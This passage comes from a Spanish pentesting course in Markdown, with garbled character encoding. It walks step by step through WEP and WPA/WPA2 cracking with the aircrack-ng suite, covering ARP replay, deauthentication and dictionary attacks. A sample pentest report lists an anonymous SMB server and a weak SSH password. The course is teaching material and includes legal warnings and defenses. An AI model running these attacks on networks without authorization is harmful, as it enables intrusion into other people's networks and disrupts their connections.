- Guarda paquetes en el archivo `wep_lab.cap`

---

#### 5. Genera trÃ¡fico (ataque ARP Replay)

> A mayor trÃ¡fico = mÃ¡s IVs = mÃ¡s rÃ¡pido se rompe la clave.

Primero, en otra terminal, ejecuta:

```bash
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```

- `-3` â†’ ataque ARP replay (repite paquetes)
- `-h` â†’ direcciÃ³n MAC de tu adaptador (puedes ver con `ifconfig`)
- Necesitas al menos **un cliente** conectado a la red WEP

---

#### 6. Espera a capturar suficientes IVs (mÃ­nimo 10,000)

Airodump-ng mostrarÃ¡ algo asÃ­:

```
#Data: 12000
```

---

#### 7. Rompe la clave WEP

Una vez capturados suficientes paquetes, corre:

```bash
aircrack-ng wep_lab-01.cap
```

VerÃ¡s algo como:

```
KEY FOUND! [ A1:B2:C3:D4:E5 ]
```

Y listo: tienes la clave WEP en texto hexadecimal (que puedes usar para conectarte).

---

### ğŸ›¡ï¸ CÃ³mo defenderse

- **Nunca uses WEP**. Es extremadamente inseguro.
- Usa **WPA2 o WPA3**
- Desactiva el WiFi si no lo necesitas
- Cambia la contraseÃ±a del router y actualiza el firmware

---

### ğŸ“ RESUMEN FINAL

| Elemento              | DescripciÃ³n sencilla                                     |
| --------------------- | -------------------------------------------------------- |
| QuÃ© es WEP            | Un protocolo antiguo de seguridad WiFi                   |
| Por quÃ© es vulnerable | Su cifrado es dÃ©bil y se puede romper fÃ¡cil              |
| QuÃ© se necesita       | Kali Linux + adaptador WiFi con modo monitor             |
| Herramientas usadas   | `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng` |
| Resultado             | Se obtiene la clave en pocos minutos                     |

---

[ğŸ”¼](#Ã­ndice)

---

## **832. Ataque a WPA**

### ğŸ§  Â¿QuÃ© es WPA/WPA2?

**WPA (Wi-Fi Protected Access)** y **WPA2** son protocolos de seguridad para redes WiFi que reemplazaron al inseguro **WEP**. Usan un cifrado mÃ¡s fuerte (TKIP y AES) y requieren una contraseÃ±a compartida.

ğŸ›¡ï¸ Son mucho mÃ¡s seguros que WEP, pero tienen **una debilidad clave**: si alguien captura el _handshake_ (apretÃ³n de manos) de conexiÃ³n, **puede intentar descifrar la contraseÃ±a por fuerza bruta o diccionario**.

---

### âŒ Â¿Por quÃ© es vulnerable?

No es el protocolo en sÃ­, sino:

- El uso de **contraseÃ±as dÃ©biles o comunes**
- El _handshake_ se puede capturar fÃ¡cilmente
- Luego se puede aplicar un **ataque de diccionario o fuerza bruta**

---

### ğŸ› ï¸ Herramientas necesarias

#### Sistema:

- Kali Linux (recomendado)
- Adaptador WiFi compatible con modo **monitor e inyecciÃ³n de paquetes**

#### Herramientas:

| Herramienta   | FunciÃ³n                                     |
| ------------- | ------------------------------------------- |
| `airmon-ng`   | Poner adaptador en modo monitor             |
| `airodump-ng` | Capturar trÃ¡fico WiFi                       |
| `aireplay-ng` | Desautenticar clientes (capturar handshake) |
| `aircrack-ng` | Descifrar la clave WPA con diccionario      |

---

### ğŸ“¥ InstalaciÃ³n (si no tienes Kali Linux)

```bash
sudo apt update
sudo apt install aircrack-ng
```

En Kali ya viene preinstalado âœ…

---

### ğŸ§ª EJEMPLO COMPLETO: Ataque WPA/WPA2

---

#### ğŸ”¹ Escenario:

- Red: `Red-WPA`
- BSSID: `AA:BB:CC:DD:EE:FF`
- Canal: `6`
- Kali Linux + adaptador WiFi
- ContraseÃ±a de la red es dÃ©bil (ejemplo: `contraseÃ±a123`)
- Diccionario: archivo `.txt` con miles de contraseÃ±as comunes

---

#### âš ï¸ Â¡IMPORTANTE!

> Este procedimiento **solo se debe realizar en redes de prueba o con autorizaciÃ³n**. Atacar redes ajenas es ilegal.

---

### ğŸ‘£ PASO A PASO:

---

#### 1. Verifica tu interfaz WiFi

```bash
iwconfig
```

Verifica que tienes algo como `wlan0`.

---

#### 2. Pon la tarjeta en modo monitor

```bash
sudo airmon-ng start wlan0
```

Esto crea `wlan0mon`.

---

#### 3. Escanea redes WiFi

```bash
sudo airodump-ng wlan0mon
```

Busca tu red objetivo, con tipo de cifrado **WPA/WPA2**.

Ejemplo:

```
BSSID              PWR  CH  ENC   ESSID
AA:BB:CC:DD:EE:FF  -42   6  WPA2  Red-WPA
```

---

#### 4. Captura el handshake de la red

Enfoca a esa red con:

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
```

Esto:

- Monitorea solo ese canal/red
- Guarda el archivo de captura: `captura.cap`

---

#### 5. Fuerza la reconexiÃ³n (ataque de desautenticaciÃ³n)

Esto es para capturar el _handshake_ cuando un cliente se reconecta:

```bash
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

- `-0 5` = envÃ­a 5 paquetes de desautenticaciÃ³n
- Cuando un cliente vuelve a conectarse, se captura el handshake automÃ¡ticamente

ğŸŸ¢ Si lo logras, verÃ¡s en `airodump-ng` una lÃ­nea que dice:

```
WPA handshake: AA:BB:CC:DD:EE:FF
```

---

#### 6. Usar diccionario para romper la clave

Usa `aircrack-ng` con un archivo de diccionario `.txt`:

```bash
aircrack-ng -w diccionario.txt captura-01.cap
```

ğŸ“˜ Puedes usar un diccionario como:

- `rockyou.txt` (viene en Kali)
- Tu propio archivo `.txt` con posibles claves

---

#### 7. Resultado exitoso

Si encuentra la clave:

```
KEY FOUND! [ contraseÃ±a123 ]
```

Ya puedes conectarte a la red.

---

### ğŸ§  Â¿DÃ³nde conseguir diccionarios?

En Kali:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

Luego Ãºsalo:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerse?

| RecomendaciÃ³n               | DescripciÃ³n                                 |
| --------------------------- | ------------------------------------------- |
| Usa WPA3 o al menos WPA2    | MÃ¡s seguro que WEP                          |
| ContraseÃ±a fuerte           | No uses "123456", "password", etc.          |
| Oculta el SSID              | Aunque no evita ataques, reduce visibilidad |
| Limita dispositivos por MAC | Filtro de acceso                            |

---

### ğŸ“˜ RESUMEN FINAL

| Elemento       | Detalle                                            |
| -------------- | -------------------------------------------------- |
| Â¿QuÃ© atacamos? | Red WiFi WPA/WPA2 con contraseÃ±a dÃ©bil             |
| Herramientas   | aircrack-ng suite (airodump-ng, aireplay-ng, etc.) |
| MÃ©todo         | Captura handshake + ataque de diccionario          |
| Resultado      | Obtener la clave si estÃ¡ en el diccionario         |

---

[ğŸ”¼](#Ã­ndice)

---

## **833. ElaboraciÃ³n de informe**

### ğŸ“„ Â¿QuÃ© es un informe de pentesting?

Es un **documento tÃ©cnico y ejecutivo** que presenta:

- Las **vulnerabilidades** encontradas en un sistema/red
- La **metodologÃ­a** utilizada
- El **impacto** que podrÃ­a tener cada vulnerabilidad
- Las **recomendaciones** para solucionarlas

Este informe se entrega a los **responsables de seguridad o gerentes** de una empresa para que puedan tomar decisiones informadas.

---

### ğŸ“‹ Estructura bÃ¡sica de un informe de pentesting

| SecciÃ³n                       | Contenido                                                              |
| ----------------------------- | ---------------------------------------------------------------------- |
| 1. Portada                    | Nombre del informe, empresa, fecha, autor                              |
| 2. Resumen ejecutivo          | ExplicaciÃ³n clara para gerentes, no tÃ©cnica                            |
| 3. Alcance y objetivos        | QuÃ© se probÃ³, quÃ© quedÃ³ fuera, metas                                   |
| 4. MetodologÃ­a                | Herramientas, fases, tipo de prueba (caja negra, blanca, etc.)         |
| 5. Hallazgos/vulnerabilidades | Lo que se descubriÃ³, pruebas realizadas, capturas de pantalla          |
| 6. EvaluaciÃ³n de riesgos      | Criticidad: alta, media, baja                                          |
| 7. Recomendaciones            | CÃ³mo arreglar o mitigar cada problema                                  |
| 8. ConclusiÃ³n                 | Resumen final de estado de seguridad                                   |
| 9. Anexos                     | Detalles tÃ©cnicos, logs, escaneos, reportes automÃ¡ticos (Nmap, Nessus) |

---

### ğŸ› ï¸ Herramientas para crear informes

| Herramienta        | Tipo              | Uso principal                        |
| ------------------ | ----------------- | ------------------------------------ |
| LibreOffice / Word | Documento .docx   | RedacciÃ³n del informe                |
| LaTeX              | Documento PDF     | Informes profesionales automatizados |
| CherryTree         | Notas de pruebas  | Toma de notas organizada             |
| Dradis             | Plataforma        | ColaboraciÃ³n y reporte centralizado  |
| Markdown + Pandoc  | Documento tÃ©cnico | RÃ¡pido y multiplataforma             |

---

### âœ… Â¿CÃ³mo instalar herramientas para informes?

#### 1. LibreOffice (en Kali Linux o Debian)

```bash
sudo apt update
sudo apt install libreoffice
```

#### 2. CherryTree

```bash
sudo apt install cherrytree
```

CherryTree es muy Ãºtil para tomar notas durante un pentest y luego copiar al informe final.

---

### ğŸ“š Ejemplo completo de informe (modelo bÃ¡sico)

---

#### ğŸ§¾ Portada

**Informe de Pentesting Interno**

Cliente: Empresa XYZ
Autor: Juan PÃ©rez
Fecha: 25 de julio de 2025

---

#### ğŸ“Œ Resumen ejecutivo

Durante la prueba de penetraciÃ³n interna realizada del 22 al 24 de julio de 2025, se identificaron **varias vulnerabilidades crÃ­ticas** que podrÃ­an comprometer la infraestructura interna de la empresa. El objetivo de este informe es detallar los hallazgos y recomendar acciones correctivas.

---

#### ğŸ¯ Alcance y objetivos

- **Alcance:** Red local 192.168.1.0/24, servidores de archivos y sitio web interno.
- **Exclusiones:** Equipos personales de empleados, red WiFi invitada.
- **Objetivo:** Evaluar la seguridad de la red interna simulando un atacante con acceso fÃ­sico.

---

#### âš™ï¸ MetodologÃ­a

Se siguieron las fases del pentesting:

1. **Reconocimiento:** Escaneo con Nmap, identificaciÃ³n de hosts y puertos abiertos
2. **EnumeraciÃ³n:** DetecciÃ³n de versiones de servicios
3. **ExplotaciÃ³n:** Intento de acceso no autorizado a servicios vulnerables
4. **Post-explotaciÃ³n:** RecolecciÃ³n de informaciÃ³n sensible

Herramientas utilizadas: `nmap`, `Nikto`, `Metasploit`, `hydra`, `enum4linux`.

---

#### ğŸš¨ Hallazgos de seguridad

##### 1. Servidor SMB con acceso anÃ³nimo habilitado

- **IP:** 192.168.1.10
- **DescripciÃ³n:** Se permite la conexiÃ³n sin usuario/contraseÃ±a
- **Prueba:** Se accediÃ³ con `smbclient -L //192.168.1.10 -N`
- **Impacto:** Permite a un atacante obtener informaciÃ³n sensible
- **Captura de pantalla**

##### 2. ContraseÃ±as dÃ©biles en servidor SSH

- **IP:** 192.168.1.15
- **Usuario:** admin
- **ContraseÃ±a:** 123456
- **Herramienta usada:** `hydra`

---

#### ğŸ“Š EvaluaciÃ³n de riesgos

| Vulnerabilidad          | Impacto | Probabilidad | Riesgo  |
| ----------------------- | ------- | ------------ | ------- |
| Acceso anÃ³nimo a SMB    | Alto    | Alta         | CrÃ­tico |
| ContraseÃ±a dÃ©bil en SSH | Alto    | Alta         | CrÃ­tico |

---

#### ğŸ›¡ï¸ Recomendaciones

- **Desactivar el acceso anÃ³nimo en SMB**
- **Forzar contraseÃ±as seguras**
- **Implementar polÃ­ticas de bloqueo de cuentas tras intentos fallidos**

---

#### âœ… ConclusiÃ³n

La red interna presenta vulnerabilidades graves que podrÃ­an comprometer activos crÃ­ticos. Se recomienda aplicar las correcciones indicadas y repetir la auditorÃ­a en un plazo mÃ¡ximo de 90 dÃ­as.

---

#### ğŸ“ Anexos

- Salida de escaneo Nmap
- Capturas de pantalla
- Reporte HTML de Nikto

---

### âœ¨ Plantillas de informe (opcional)

Si lo deseas, puedo generarte:

- Una plantilla `.docx` editable
- Un informe automÃ¡tico con Pandoc y Markdown
- Una versiÃ³n en LaTeX con grÃ¡ficos

---

### ğŸ§  Consejos finales

- Usa lenguaje claro y profesional
- Evita jerga tÃ©cnica en el resumen ejecutivo
- Incluye evidencia: capturas, comandos, logs
- Asigna prioridades (crÃ­tico, alto, medio, bajo)
- PropÃ³n soluciones concretas

---

[ğŸ”¼](#Ã­ndice)

---

| **Inicio**         | **atrÃ¡s 10**                                  | **Siguiente 12**                            |
| ------------------ | --------------------------------------------- | ------------------------------------------- |
| [ğŸ ](../README.md) | [âª](./7_10_Seguridad_de_Redes_On_Premise.md) | [â©](./7_12_Fundamentos_de_Criptografia.md) |
